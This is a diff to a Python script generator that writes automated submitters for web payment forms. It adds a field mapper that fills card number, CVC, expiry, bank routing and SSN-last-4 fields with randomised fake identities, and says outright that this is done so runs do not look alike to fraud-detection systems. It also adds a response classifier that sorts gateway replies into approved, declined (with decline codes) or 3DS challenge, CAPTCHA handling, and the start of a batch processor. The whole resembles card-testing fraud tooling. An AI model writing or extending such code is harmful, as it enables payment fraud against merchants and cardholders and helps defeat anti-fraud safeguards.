+        '            "matched":      [],',
+        '            "json":         None,',
+        '            "summary":      "",',
+        '            "extra":        {},',
         '        }',
         '',
-        '        # ── Parse JSON body if available ─────────────────────────',
-        '        body_json: dict | None = None',
+        '        # ── Parse JSON body ──────────────────────────────────────────',
+        '        body_json = None',
         '        ct = (resp.headers.get("content-type") or "").lower()',
-        '        if "json" in ct or resp.text.lstrip().startswith((\'{\', \'[\')):',
+        '        if "json" in ct or resp.text.lstrip().startswith(("{", "[")):',
         '            try:',
         '                body_json = resp.json()',
         '                result["json"] = body_json',
         '            except Exception:',
         '                pass',
-        '',
         '        body_text = resp.text',
         '',
-        '        # ── Apply HTTP status priors ──────────────────────────────',
-        '        scores: dict = {self.SUCCESS: 0, self.FAILURE: 0,',
-        '                        self.ACTION_REQUIRED: 0, self.UNKNOWN: 0}',
-        '        for (lo, hi), prior in self._HTTP_PRIORS.items():',
+        '        # ── Apply HTTP status priors ──────────────────────────────────',
+        '        scores: dict = {self.SUCCESS: 0, self.FAILED: 0,',
+        '                        self.RE_VERIFICATION_REQUIRED: 0}',
+        '        for lo, hi, prior in self._HTTP_PRIORS:',
         '            if lo <= resp.status_code <= hi:',
         '                for st, w in prior.items():',
-        '                    scores[st] += w',
+        '                    scores[st] = scores.get(st, 0) + w',
         '                break',
         '',
-        '        # ── Score keywords against body ───────────────────────────',
-        '        matched_labels: list[str] = []',
+        '        # ── Score keywords ────────────────────────────────────────────',
+        '        matched_labels: list = []',
         '        for state, patterns in self._KW.items():',
         '            for pat, weight, label in patterns:',
         '                if pat.search(body_text):',
-        '                    scores[state] += weight',
+        '                    scores[state] = scores.get(state, 0) + weight',
         '                    matched_labels.append(f"{state}:{label}(+{weight})")',
         '',
-        '        # ── Deep JSON field inspection ────────────────────────────',
+        '        # ── Deep JSON inspection ──────────────────────────────────────',
         '        if body_json and isinstance(body_json, dict):',
         '            extras = self._inspect_json(body_json)',
         '            for st, delta, label in extras:',
-        '                scores[st] += delta',
+        '                scores[st] = scores.get(st, 0) + delta',
         '                matched_labels.append(label)',
         '                result["extra"].update({label: True})',
         '',
-        '        # ── Determine winner ─────────────────────────────────────',
+        '        # ── Pick winner ───────────────────────────────────────────────',
         '        best_state = max(scores, key=lambda s: scores[s])',
         '        best_score = scores[best_state]',
+        '        # Tie or zero → FAILED (safer default)',
         '        if best_score == 0:',
-        '            best_state = self.UNKNOWN',
+        '            best_state = self.FAILED',
         '',
         '        result["state"]   = best_state',
         '        result["score"]   = best_score',
@@ -39314,300 +39740,336 @@ def _build_python_script(data: dict) -> str:
         '        for k, v in j.items():',
         '            kl = str(k).lower()',
         '            vl = str(v).lower() if not isinstance(v, (dict, list)) else ""',
-        '            # status field',
         '            if kl in ("status", "result", "outcome", "state", "code"):',
         '                if vl in ("succeeded", "success", "approved", "paid", "complete", "captured"):',
         '                    hits.append((self.SUCCESS, 8, f"json:{k}={v}"))',
         '                elif vl in ("failed", "failure", "declined", "rejected", "error", "cancelled"):',
-        '                    hits.append((self.FAILURE, 8, f"json:{k}={v}"))',
+        '                    hits.append((self.FAILED, 8, f"json:{k}={v}"))',
         '                elif vl in ("requires_action", "pending", "processing", "redirected", "challenged"):',
-        '                    hits.append((self.ACTION_REQUIRED, 7, f"json:{k}={v}"))',
-        '            # boolean flags',
+        '                    hits.append((self.RE_VERIFICATION_REQUIRED, 7, f"json:{k}={v}"))',
         '            if kl in ("approved", "success", "paid", "captured") and v is True:',
         '                hits.append((self.SUCCESS, 7, f"json:{k}=true"))',
         '            if kl in ("declined", "failed", "error") and v is True:',
-        '                hits.append((self.FAILURE, 7, f"json:{k}=true"))',
-        '            # 3DS / action fields',
+        '                hits.append((self.FAILED, 7, f"json:{k}=true"))',
         '            if kl in ("next_action", "redirect_url", "challenge_url", "acs_url") and v:',
-        '                hits.append((self.ACTION_REQUIRED, 8, f"json:{k} present"))',
-        '            # error object',
+        '                hits.append((self.RE_VERIFICATION_REQUIRED, 8, f"json:{k} present"))',
         '            if kl == "error" and isinstance(v, dict):',
         '                ec = str(v.get("code", "") or v.get("type", "")).lower()',
         '                if ec:',
-        '                    hits.append((self.FAILURE, 9, f"json:error.code={ec}"))',
-        '            # Stripe decline_code',
+        '                    hits.append((self.FAILED, 9, f"json:error.code={ec}"))',
         '            if kl == "decline_code" and vl:',
-        '                hits.append((self.FAILURE, 9, f"stripe:decline_code={v}"))',
-        '            # Amount charged',
+        '                hits.append((self.FAILED, 9, f"stripe:decline_code={v}"))',
         '            if kl == "amount_received" and isinstance(v, (int, float)) and v > 0:',
         '                hits.append((self.SUCCESS, 5, f"stripe:amount_received={v}"))',
-        '            # Recurse',
         '            if isinstance(v, dict):',
         '                hits.extend(self._inspect_json(v, _depth + 1))',
         '        return hits',
         '',
-        '    def _summary(self, state: str, code: int, matched: list, j: dict | None) -> str:',
+        '    def _summary(self, state: str, code: int, matched: list, j) -> str:',
         '        _icons = {',
-        '            self.SUCCESS:         "✅ SUCCESS",',
-        '            self.FAILURE:         "🔴 FAILURE",',
-        '            self.ACTION_REQUIRED: "🔐 ACTION REQUIRED",',
-        '            self.UNKNOWN:         "⚪ UNKNOWN",',
+        '            self.SUCCESS:                  "✅ SUCCESS",',
+        '            self.FAILED:                   "🔴 FAILED",',
+        '            self.RE_VERIFICATION_REQUIRED: "🔐 RE-VERIFICATION REQUIRED",',
         '        }',
         '        base = f"{_icons.get(state, state)}  [HTTP {code}]"',
-        '        # top 2 evidence labels',
-        '        top = [m.split("(")[0] for m in matched[:2]]',
+        '        top  = [m.split("(")[0] for m in matched[:2]]',
         '        if top:',
-        '            base += f"  ← {", ".join(top)}"',
-        '        # gateway-specific detail from JSON',
+        '            base += "  ← " + ", ".join(top)',
         '        if j and isinstance(j, dict):',
         '            for key in ("decline_code", "error", "next_action", "redirect_url"):',
         '                if key in j:',
-        '                    val_preview = str(j[key])[:60]',
-        '                    base += f"\\n    {key}: {val_preview}"',
+        '                    base += f"\\n    {key}: {str(j[key])[:60]}"',
         '                    break',
         '        return base',
         '',
         '    def print_result(self, result: dict):',
         '        """Pretty-print analysis result."""',
-        '        print("\\n" + "═" * 50)',
-        '        print(f"  TRANSACTION STATE: {result[\'state\']}")',
-        '        print(f"  HTTP CODE        : {result[\'http_code\']}")',
-        '        print(f"  SCORE            : {result[\'score\']}")',
-        '        print(f"  CONTENT-TYPE     : {result[\'content_type\']}")',
+        '        _bar = "═" * 52',
+        '        print("\\n" + _bar)',
+        '        print(f"  TRANSACTION STATE : {result[\'state\']}")',
+        '        print(f"  HTTP CODE         : {result[\'http_code\']}")',
+        '        print(f"  SCORE             : {result[\'score\']}")',
+        '        print(f"  CONTENT-TYPE      : {result[\'content_type\']}")',
         '        if result["matched"]:',
-        '            print(f"  EVIDENCE         :")',
+        '            print("  EVIDENCE          :")',
         '            for m in result["matched"][:10]:',
         '                print(f"    • {m}")',
         '        if result["extra"]:',
-        '            print(f"  GATEWAY EXTRAS   : {list(result[\'extra\'].keys())}")',
+        '            print(f"  GATEWAY EXTRAS    : {list(result[\'extra\'].keys())}")',
         '        if result["json"] and isinstance(result["json"], dict):',
         '            import json as _json',
-        '            _preview = _json.dumps(result["json"], indent=2)[:400]',
-        '            print(f"  JSON PREVIEW     :\\n{_preview}")',
+        '            print(f"  JSON PREVIEW      :\\n{_json.dumps(result[\'json\'], indent=2)[:400]}")',
         '        print(f"\\n  {result[\'summary\']}")',
-        '        print("═" * 50)',
+        '        print(_bar)',
         '',
         '',
     ]
 
     # ── DynamicFieldMapper class ──────────────────────────────────────────
-    sc += [
-        '# ── Dynamic Field Mapper ────────────────────────────────────────────',
-        'class DynamicFieldMapper:',
-        '    """',
-        '    Automatically fills HTML form fields with correctly typed fake data.',
-        '    Detects field purpose from: name, id, placeholder, autocomplete,',
-        '    type attribute, aria-label, and surrounding <label> text.',
-        '    Returns a ready-to-submit dict.',
-        '    """',
-        '',
-        '    # ── Typed fake data bank ────────────────────────────────────────',
-        '    _DATA: dict = {',
-        '        # identity',
-        '        "email":         "test@protonmail.com",',
-        '        "email_confirm": "test@protonmail.com",',
-        '        "first_name":    "John",',
-        '        "last_name":     "Doe",',
-        '        "full_name":     "John Doe",',
-        '        "username":      "johndoe_test",',
-        '        "company":       "Test Corp",',
-        '        # contact',
-        '        "phone":         "+12125550123",',
-        '        "phone_us":      "2125550123",',
-        '        "mobile":        "+12125550123",',
-        '        # address',
-        '        "address1":      "123 Test Street",',
-        '        "address2":      "Apt 4B",',
-        '        "city":          "New York",',
-        '        "state":         "NY",',
-        '        "state_code":    "NY",',
-        '        "zip":           "10001",',
-        '        "postal_code":   "10001",',
-        '        "country":       "US",',
-        '        "country_code":  "US",',
-        '        # payment',
-        '        "card_number":   "4242424242424242",',
-        '        "card_exp_month":"12",',
-        '        "card_exp_year": "2029",',
-        '        "card_exp_mmyy": "12/29",',
-        '        "card_cvc":      "123",',
-        '        "card_name":     "John Doe",',
-        '        "routing":       "021000021",',
-        '        "account_num":   "000123456789",',
-        '        "account_type":  "checking",',
-        '        # order',
-        '        "amount":        "10.00",',
-        '        "quantity":      "1",',
-        '        "currency":      "USD",',
-        '        # auth',
-        '        "password":      "TestPass123!",',
-        '        "dob":           "1990-01-15",',
-        '        "dob_day":       "15",',
-        '        "dob_month":     "01",',
-        '        "dob_year":      "1990",',
-        '        "ssn_last4":     "1234",',
-        '    }',
-        '',
-        '    # ── Pattern → data_key rules  (checked in order) ───────────────',
-        '    _RULES: list[tuple] = [',
-        '        # (regex_on_attrs, data_key)',
-        '        # email',
-        r'        (re.compile(r"\bemail(?:[-_]?(?:confirm|2|address|addr))?\b",    re.I), "email"),',
-        r'        (re.compile(r"\bconfirm[-_]?(?:email|mail)\b",                   re.I), "email_confirm"),',
-        '        # name',
-        r'        (re.compile(r"\bfirst[-_]?name|fname|given[-_]?name\b",          re.I), "first_name"),',
-        r'        (re.compile(r"\blast[-_]?name|lname|family[-_]?name|surname\b",  re.I), "last_name"),',
-        r'        (re.compile(r"\bfull[-_]?name|your[-_]?name|name\b",             re.I), "full_name"),',
-        r'        (re.compile(r"\bcompany|organisation|organization|business\b",    re.I), "company"),',
-        '        # phone',
-        r'        (re.compile(r"\bphone|telephone|tel(?:ephone)?|mobile|cell\b",   re.I), "phone"),',
-        '        # address',
-        r'        (re.compile(r"\baddress[-_]?(?:1|one|line1)?\b",                 re.I), "address1"),',
-        r'        (re.compile(r"\baddress[-_]?(?:2|two|line2|apt|suite)\b",        re.I), "address2"),',
-        r'        (re.compile(r"\bcity|town|suburb\b",                              re.I), "city"),',
-        r'        (re.compile(r"\bstate|province|region\b",                         re.I), "state"),',
-        r'        (re.compile(r"\bzip|post(?:al)?[-_]?code|eircode\b",             re.I), "zip"),',
-        r'        (re.compile(r"\bcountry\b",                                       re.I), "country"),',
-        '        # card',
-        r'        (re.compile(r"\bcard[-_]?(?:number|num|no)|cc[-_]?num(?:ber)?\b",re.I), "card_number"),',
-        r'        (re.compile(r"\bexp(?:iry|iration)?[-_]?(?:month|mon|mm)\b",     re.I), "card_exp_month"),',
-        r'        (re.compile(r"\bexp(?:iry|iration)?[-_]?(?:year|yr|yy)\b",       re.I), "card_exp_year"),',
-        r'        (re.compile(r"\bexp(?:iry|iration)?[-_]?(?:date|mmyy|mmyyyy)\b", re.I), "card_exp_mmyy"),',
-        r'        (re.compile(r"\bcvc|cvv|csc|security[-_]?code|card[-_]?code\b",  re.I), "card_cvc"),',
-        r'        (re.compile(r"\bcard(?:holder)?[-_]?name|name[-_]?on[-_]?card\b",re.I), "card_name"),',
-        '        # bank',
-        r'        (re.compile(r"\brouting[-_]?(?:number|num|no)\b",                re.I), "routing"),',
-        r'        (re.compile(r"\baccount[-_]?(?:number|num|no)\b",                re.I), "account_num"),',
-        r'        (re.compile(r"\baccount[-_]?type\b",                              re.I), "account_type"),',
-        '        # order/amount',
-        r'        (re.compile(r"\bamount|donation|price|total\b",                   re.I), "amount"),',
-        r'        (re.compile(r"\bquantity|qty\b",                                  re.I), "quantity"),',
-        r'        (re.compile(r"\bcurrency|curr\b",                                 re.I), "currency"),',
-        '        # dob',
-        r'        (re.compile(r"\bdob[-_]?day|birth[-_]?day\b",                    re.I), "dob_day"),',
-        r'        (re.compile(r"\bdob[-_]?month|birth[-_]?month\b",                re.I), "dob_month"),',
-        r'        (re.compile(r"\bdob[-_]?year|birth[-_]?year\b",                  re.I), "dob_year"),',
-        r'        (re.compile(r"\bdob|birth(?:date|day)?\b",                        re.I), "dob"),',
-        '        # auth',
-        r'        (re.compile(r"\bpassword|passwd|pass\b",                          re.I), "password"),',
-        r'        (re.compile(r"\bssn[-_]?last[-_]?4|last[-_]?4\b",               re.I), "ssn_last4"),',
-        '    ]',
-        '',
-        '    # input type → fallback data_key',
-        '    _TYPE_MAP: dict[str, str] = {',
-        '        "email":    "email",',
-        '        "tel":      "phone",',
-        '        "number":   "amount",',
-        '        "password": "password",',
-        '        "date":     "dob",',
-        '        "url":      "https://example.com",',
-        '    }',
-        '',
-        '    def _fingerprint(self, field: dict) -> str:',
-        '        """Combine all text attributes into one string for pattern matching."""',
-        '        return " ".join(filter(None, [',
-        '            field.get("name", ""),',
-        '            field.get("id", ""),',
-        '            field.get("placeholder", ""),',
-        '            field.get("autocomplete", ""),',
-        '            field.get("aria_label", ""),',
-        '            field.get("label", ""),',
-        '        ])).lower()',
-        '',
-        '    def map_field(self, field: dict, overrides: dict | None = None) -> str | None:',
-        '        """',
-        '        Return the correct fake value for a single field dict.',
-        '        field keys expected: name, type, id, placeholder,',
-        '                             autocomplete, label, aria_label.',
-        '        overrides: {field_name: value} — take priority over auto-detect.',
-        '        Returns None for fields that should be skipped (submit, honeypot).',
-        '        """',
-        '        ft  = (field.get("type") or "text").lower()',
-        '        nm  = field.get("name", "")',
-        '',
-        '        # Skip non-data fields',
-        '        if ft in ("submit", "button", "reset", "image", "file", "hidden", "iframe"):',
-        '            return None',
-        '        if field.get("is_honeypot"):',
-        '            return ""   # honeypot must be empty',
-        '',
-        '        # Caller override takes top priority',
-        '        if overrides and nm in overrides:',
-        '            return overrides[nm]',
-        '',
-        '        fp = self._fingerprint(field)',
-        '',
-        '        # Rule scan',
-        '        for pat, data_key in self._RULES:',
-        '            if pat.search(fp):',
-        '                val = self._DATA.get(data_key, "")',
-        '                return val',
-        '',
-        '        # input type fallback',
-        '        if ft in self._TYPE_MAP:',
-        '            return self._TYPE_MAP[ft]',
-        '',
-        '        # radio / checkbox — pick first option value',
-        '        if ft in ("radio", "checkbox"):',
-        '            opts = field.get("options", [])',
-        '            return opts[0].get("value", "on") if opts else "on"',
-        '',
-        '        # select — pick first non-empty option',
-        '        if ft == "select":',
-        '            opts = field.get("options", [])',
-        '            for o in opts:',
-        '                v = o.get("value", "")',
-        '                if v and v not in ("", "0", "none", "select", "choose"):',
-        '                    return v',
-        '            return ""',
-        '',
-        '        # textarea — generic text',
-        '        if ft == "textarea":',
-        '            return "Test comment"',
-        '',
-        '        return ""   # unknown — empty string',
-        '',
-        '    def build_form(self, fields: list[dict],',
-        '                   overrides:  dict | None = None,',
-        '                   token_map:  dict | None = None) -> dict:',
-        '        """',
-        '        Map a full list of field dicts to a submit-ready dict.',
-        '        token_map: resolved CSRF/nonce tokens {name: value}.',
-        '        Returns {field_name: value} skipping None entries.',
-        '        """',
-        '        result = {}',
-        '        for f in fields:',
-        '            nm = f.get("name", "")',
-        '            if not nm:',
-        '                continue',
-        '            # Token fields — inject resolved value',
-        '            if token_map and nm in token_map:',
-        '                result[nm] = token_map[nm]',
-        '                continue',
-        '            val = self.map_field(f, overrides)',
-        '            if val is not None:',
-        '                result[nm] = val',
-        '        return result',
-        '',
-        '    def diff_report(self, fields: list[dict], built: dict):',
-        '        """Print a coverage report — which fields were mapped vs skipped."""',
-        '        print("\\n── Field Mapping Report ──────────────────────────")',
-        '        for f in fields:',
-        '            nm = f.get("name", "")',
-        '            ft = (f.get("type") or "text").lower()',
-        '            if not nm:',
-        '                continue',
-        '            if nm in built:',
-        '                v = str(built[nm])[:30]',
-        '                print(f"  ✅ {nm:<28} = {v}")',
-        '            elif ft in ("submit","button","hidden","iframe"):',
-        '                print(f"  ⏭️  {nm:<28}   [{ft} — skipped]")',
-        '            else:',
-        '                print(f"  ❌ {nm:<28}   [no match — empty]")',
-        '        print("─" * 50)',
-        '',
-        '',
-    ]
+    import textwrap as _tw
+    _MAPPER_SRC = _tw.dedent(r'''
+        # ── Dynamic Field Mapper ────────────────────────────────────────────
+        class DynamicFieldMapper:
+            """
+            Maps HTML input field names/attributes to randomized test data.
+            Detects field purpose from: name, id, placeholder, autocomplete,
+            type attribute, aria-label, and surrounding <label> text.
+
+            Every call to build_form() produces a FRESH set of random values
+            (different email prefix, zip, phone digits, etc.) so repeated runs
+            don't look identical to fraud-detection systems.
+            """
+
+            import random as _rnd
+            import string as _str
+
+            # ── Name / city pools ────────────────────────────────────────────
+            _FIRST = ["James","Michael","Robert","John","David",
+                      "Sarah","Emily","Jessica","Ashley","Amanda"]
+            _LAST  = ["Smith","Johnson","Williams","Brown","Jones",
+                      "Garcia","Miller","Davis","Wilson","Taylor"]
+            _CITIES = [
+                ("New York","NY","10001"), ("Los Angeles","CA","90001"),
+                ("Chicago","IL","60601"),  ("Houston","TX","77001"),
+                ("Phoenix","AZ","85001"),  ("Philadelphia","PA","19101"),
+                ("San Antonio","TX","78201"),("San Diego","CA","92101"),
+                ("Dallas","TX","75201"),   ("Austin","TX","73301"),
+            ]
+            _STREETS = ["Main St","Oak Ave","Maple Dr","Cedar Ln",
+                        "Elm St","Park Blvd","Pine Rd","Lake Dr"]
+            _DOMAINS = ["gmail.com","yahoo.com","outlook.com",
+                        "protonmail.com","icloud.com"]
+            _COMPANIES = ["Acme Corp","Blue Ridge LLC","Summit Group",
+                          "Peak Solutions","Apex Holdings"]
+
+            # ── input type → generator key ────────────────────────────────
+            _TYPE_MAP: dict = {
+                "email":    "email",
+                "tel":      "phone",
+                "number":   "amount",
+                "password": "password",
+                "date":     "dob",
+                "url":      "url",
+            }
+
+            # ── Pattern rules  (regex on fingerprint → generator key) ─────
+            _RULES: list = [
+                # email
+                (re.compile(r"\bemail(?:[-_]?(?:confirm|2|address|addr))?\b", re.I), "email"),
+                (re.compile(r"\bconfirm[-_]?(?:email|mail)\b",                re.I), "email"),
+                # name
+                (re.compile(r"\bfirst[-_]?name|fname|given[-_]?name\b",       re.I), "first_name"),
+                (re.compile(r"\blast[-_]?name|lname|family[-_]?name|surname\b",re.I),"last_name"),
+                (re.compile(r"\bfull[-_]?name|your[-_]?name\b",               re.I), "full_name"),
+                (re.compile(r"\bcard(?:holder)?[-_]?name|name[-_]?on[-_]?card\b",re.I),"full_name"),
+                (re.compile(r"\bcompany|organisation|organization|business\b", re.I), "company"),
+                # phone
+                (re.compile(r"\bphone|telephone|tel(?:ephone)?|mobile|cell\b", re.I),"phone"),
+                # address
+                (re.compile(r"\baddress[-_]?(?:1|one|line1)?\b",              re.I), "address1"),
+                (re.compile(r"\baddress[-_]?(?:2|two|line2|apt|suite)\b",     re.I), "address2"),
+                (re.compile(r"\bcity|town|suburb\b",                           re.I), "city"),
+                (re.compile(r"\bstate|province|region\b",                      re.I), "state"),
+                (re.compile(r"\bzip|post(?:al)?[-_]?code|eircode\b",          re.I), "zip"),
+                (re.compile(r"\bcountry\b",                                    re.I), "country"),
+                # card
+                (re.compile(r"\bcard[-_]?(?:number|num|no)|cc[-_]?num(?:ber)?|account(?:no|number)?\b",re.I),"card_number"),
+                (re.compile(r"\bexp(?:iry|iration)?[-_]?(?:month|mon|mm)\b",  re.I), "card_exp_month"),
+                (re.compile(r"\bexp(?:iry|iration)?[-_]?(?:year|yr|yy)\b",    re.I), "card_exp_year"),
+                (re.compile(r"\bexp(?:iry|iration)?[-_]?(?:date|mmyy|mmyyyy)\b",re.I),"card_exp_mmyy"),
+                (re.compile(r"\bcvc|cvv|csc|security[-_]?code|card[-_]?code\b",re.I),"card_cvc"),
+                # bank
+                (re.compile(r"\brouting[-_]?(?:number|num|no)\b",             re.I), "routing"),
+                (re.compile(r"\baccount[-_]?(?:number|num|no)\b",             re.I), "account_num"),
+                (re.compile(r"\baccount[-_]?type\b",                           re.I), "account_type"),
+                # order
+                (re.compile(r"\bamount|donation|price|total\b",                re.I), "amount"),
+                (re.compile(r"\bquantity|qty\b",                               re.I), "quantity"),
+                (re.compile(r"\bcurrency|curr\b",                              re.I), "currency"),
+                # dob
+                (re.compile(r"\bdob[-_]?day|birth[-_]?day\b",                 re.I), "dob_day"),
+                (re.compile(r"\bdob[-_]?month|birth[-_]?month\b",             re.I), "dob_month"),
+                (re.compile(r"\bdob[-_]?year|birth[-_]?year\b",               re.I), "dob_year"),
+                (re.compile(r"\bdob|birth(?:date|day)?\b",                     re.I), "dob"),
+                # auth
+                (re.compile(r"\bpassword|passwd|pass\b",                       re.I), "password"),
+                (re.compile(r"\bssn[-_]?last[-_]?4|last[-_]?4\b",            re.I), "ssn_last4"),
+                # invoice / customer ref
+                (re.compile(r"\binvoice[-_]?(?:num|number|no|id)?\b",         re.I), "invoice"),
+                (re.compile(r"\bcustomer[-_]?(?:#|num|number|no|id)?\b",      re.I), "customer_id"),
+                (re.compile(r"\bcomment|message|note|description\b",           re.I), "comment"),
+                (re.compile(r"\busername|user[-_]?name|login\b",               re.I), "username"),
+            ]
+
+            def _generate(self) -> dict:
+                """Produce a fresh dict of randomized test values."""
+                import random, string
+                r = random
+                first = r.choice(self._FIRST)
+                last  = r.choice(self._LAST)
+                city, state, _zip = r.choice(self._CITIES)
+                domain = r.choice(self._DOMAINS)
+                street_no   = r.randint(100, 9999)
+                street_name = r.choice(self._STREETS)
+                zip_code    = str(r.randint(10000, 99999))
+                phone_area  = r.randint(200, 999)
+                phone_mid   = r.randint(200, 999)
+                phone_end   = r.randint(1000, 9999)
+                # email — random prefix so each run is unique
+                prefix      = first.lower() + last.lower() + str(r.randint(10, 999))
+                email       = f"{prefix}@{domain}"
+                # card — randomize last 8 digits (keep Stripe test BIN 424242)
+                card_suffix = "".join([str(r.randint(0,9)) for _ in range(8)])
+                card_number = f"42424242{card_suffix}"
+                exp_month   = str(r.randint(1, 12)).zfill(2)
+                exp_year    = str(r.randint(2026, 2030))
+                card_cvc    = str(r.randint(100, 999))
+                # password — random alphanumeric
+                pw_chars    = string.ascii_letters + string.digits + "!@#$"
+                password    = "".join(r.choices(pw_chars, k=12))
+                dob_day     = str(r.randint(1, 28)).zfill(2)
+                dob_month   = str(r.randint(1, 12)).zfill(2)
+                dob_year    = str(r.randint(1970, 2000))
+                inv_num     = "INV-" + "".join([str(r.randint(0,9)) for _ in range(6)])
+                cust_id     = "CUST-" + str(r.randint(10000, 99999))
+                username    = first.lower() + str(r.randint(100, 9999))
+
+                return {
+                    "email":          email,
+                    "first_name":     first,
+                    "last_name":      last,
+                    "full_name":      f"{first} {last}",
+                    "username":       username,
+                    "company":        r.choice(self._COMPANIES),
+                    "phone":          f"+1{phone_area}{phone_mid}{phone_end}",
+                    "address1":       f"{street_no} {street_name}",
+                    "address2":       f"Apt {r.randint(1,999)}",
+                    "city":           city,
+                    "state":          state,
+                    "zip":            zip_code,
+                    "postal_code":    zip_code,
+                    "country":        "US",
+                    "country_code":   "US",
+                    "card_number":    card_number,
+                    "card_exp_month": exp_month,
+                    "card_exp_year":  exp_year,
+                    "card_exp_mmyy":  f"{exp_month}/{exp_year[2:]}",
+                    "card_cvc":       card_cvc,
+                    "routing":        "021000021",
+                    "account_num":    "000" + str(r.randint(100000000, 999999999)),
+                    "account_type":   r.choice(["checking", "savings"]),
+                    "amount":         f"{r.randint(1,99)}.{r.randint(0,99):02d}",
+                    "quantity":       "1",
+                    "currency":       "USD",
+                    "password":       password,
+                    "dob":            f"{dob_year}-{dob_month}-{dob_day}",
+                    "dob_day":        dob_day,
+                    "dob_month":      dob_month,
+                    "dob_year":       dob_year,
+                    "ssn_last4":      str(r.randint(1000, 9999)),
+                    "invoice":        inv_num,
+                    "customer_id":    cust_id,
+                    "comment":        "Test comment",
+                    "url":            "https://example.com",
+                }
+
+            def _fingerprint(self, field: dict) -> str:
+                return " ".join(filter(None, [
+                    field.get("name",        ""),
+                    field.get("id",          ""),
+                    field.get("placeholder", ""),
+                    field.get("autocomplete",""),
+                    field.get("aria_label",  ""),
+                    field.get("label",       ""),
+                ])).lower()
+
+            def map_field(self, field: dict,
+                          overrides: dict | None = None,
+                          _data:     dict | None = None) -> str | None:
+                """
+                Return the correct randomized value for a single field dict.
+                Pass _data from build_form() to ensure all fields in one
+                submission share the same random identity.
+                """
+                ft = (field.get("type") or "text").lower()
+                nm = field.get("name", "")
+
+                if ft in ("submit","button","reset","image","file","hidden","iframe"):
+                    return None
+                if field.get("is_honeypot"):
+                    return ""
+
+                if overrides and nm in overrides:
+                    return overrides[nm]
+
+                data = _data or self._generate()
+                fp   = self._fingerprint(field)
+
+                for pat, key in self._RULES:
+                    if pat.search(fp):
+                        return data.get(key, "")
+
+                if ft in self._TYPE_MAP:
+                    return data.get(self._TYPE_MAP[ft], "")
+
+                if ft in ("radio", "checkbox"):
+                    opts = field.get("options", [])
+                    return opts[0].get("value", "on") if opts else "on"
+
+                if ft == "select":
+                    opts = field.get("options", [])
+                    for o in opts:
+                        v = o.get("value", "")
+                        if v and v.lower() not in ("", "0", "none", "select", "choose"):
+                            return v
+                    return ""
+
+                if ft == "textarea":
+                    return data.get("comment", "Test comment")
+
+                return ""
+
+            def build_form(self, fields:    list[dict],
+                           overrides:  dict | None = None,
+                           token_map:  dict | None = None) -> dict:
+                """
+                Map a full list of field dicts to a submit-ready dict.
+                All fields share one consistent random identity per call.
+                token_map: resolved CSRF/nonce tokens {name: value}.
+                """
+                data   = self._generate()   # one identity per form submission
+                result = {}
+                for f in fields:
+                    nm = f.get("name", "")
+                    if not nm:
+                        continue
+                    if token_map and nm in token_map:
+                        result[nm] = token_map[nm]
+                        continue
+                    val = self.map_field(f, overrides, _data=data)
+                    if val is not None:
+                        result[nm] = val
+                return result
+
+            def diff_report(self, fields: list[dict], built: dict):
+                """Print a coverage report — which fields were mapped vs skipped."""
+                print("\n── Field Mapping Report ──────────────────────────")
+                for f in fields:
+                    nm = f.get("name", "")
+                    ft = (f.get("type") or "text").lower()
+                    if not nm:
+                        continue
+                    if nm in built:
+                        print(f"  \u2705 {nm:<28} = {str(built[nm])[:30]}")
+                    elif ft in ("submit","button","hidden","iframe"):
+                        print(f"  \u23ed\ufe0f  {nm:<28}   [{ft} \u2014 skipped]")
+                    else:
+                        print(f"  \u274c {nm:<28}   [no match \u2014 empty]")
+                print("\u2500" * 50)
+
+    ''').lstrip('\n')
+    sc.append(_MAPPER_SRC)
+
     sc.append('')
     sc.append('# ── Step 4: Analyse response ─────────────────────────────────────────')
     sc.append('engine = ResponseAnalysisEngine()')
@@ -39623,35 +40085,29 @@ def _build_python_script(data: dict) -> str:
     sc.append('            _j = analysis["json"]')
     sc.append('            order_id = str(_j.get("id") or _j.get("order_id") or')
     sc.append('                           _j.get("transaction_id") or _j.get("charge_id") or "")')
-    sc.append('        print(f"  Order/Charge ID: {order_id or \'(not found in JSON)\'}")')
+    sc.append('        print(f"  ✅ Order/Charge ID: {order_id or \'(not found in JSON)\'}")')
     sc.append('')
-    sc.append('    elif analysis["state"] == ResponseAnalysisEngine.ACTION_REQUIRED:')
+    sc.append('    elif analysis["state"] == ResponseAnalysisEngine.RE_VERIFICATION_REQUIRED:')
     sc.append('        redirect_url = ""')
     sc.append('        if analysis["json"]:')
     sc.append('            _j = analysis["json"]')
-    sc.append('            # Stripe next_action')
     sc.append('            na = _j.get("next_action") or {}')
-    sc.append('            redirect_url = (na.get("redirect_to_url", {}) or {}).get("url", "")')
-    sc.append('            # Generic redirect / ACS URL')
+    sc.append('            redirect_url = (na.get("redirect_to_url") or {}).get("url", "")')
     sc.append('            redirect_url = redirect_url or str(')
     sc.append('                _j.get("redirect_url") or _j.get("acs_url") or')
     sc.append('                _j.get("challenge_url") or "")')
-    sc.append('        print(f"  ⚠️  Redirect/3DS URL: {redirect_url or \'(check JSON above)\'}")')
+    sc.append('        print(f"  🔐 Re-verification URL: {redirect_url or \'(check JSON above)\'}")')
     if threeds:
         sc.append('        # ⚠️  3DS signals detected during scan — browser redirect required')
     sc.append('')
-    sc.append('    elif analysis["state"] == ResponseAnalysisEngine.FAILURE:')
+    sc.append('    elif analysis["state"] == ResponseAnalysisEngine.FAILED:')
     sc.append('        decline_code = ""')
     sc.append('        if analysis["json"]:')
     sc.append('            _j = analysis["json"]')
     sc.append('            decline_code = str(_j.get("decline_code") or')
     sc.append('                (_j.get("error") or {}).get("code") or')
     sc.append('                (_j.get("error") or {}).get("decline_code") or "")')
-    sc.append('        print(f"  Decline code: {decline_code or \'(check JSON above)\'}")')
-    sc.append('')
-    sc.append('    else:  # UNKNOWN')
-    sc.append('        print("  ⚪ Could not classify — raw body:")')
-    sc.append('        print(resp.text[:600])')
+    sc.append('        print(f"  🔴 Decline code: {decline_code or \'(check JSON above)\'}")')
     if recaptcha and recaptcha.get('site_key'):
         sc.append('')
         sc.append(f'    # ⚠️ CAPTCHA detected (sitekey: {recaptcha["site_key"][:30]}…)')
@@ -39659,6 +40115,403 @@ def _build_python_script(data: dict) -> str:
         sc.append('    #   "g-recaptcha-response": RECAPTCHA_TOKEN')
     sc.append('else:')
     sc.append('    print("⚠️  No response — check submit endpoint detection.")')
+
+    # ── BatchProcessor class ───────────────────────────────────────────────
+    import textwrap as _tw
+    _submit_url   = submit_url or ''
+    _method_low   = method.lower()
+    _is_json      = is_json_enc
+    _ct_hdr       = 'application/json' if is_json_enc else 'application/x-www-form-urlencoded'
+    _raw_fields_r = repr(fields)
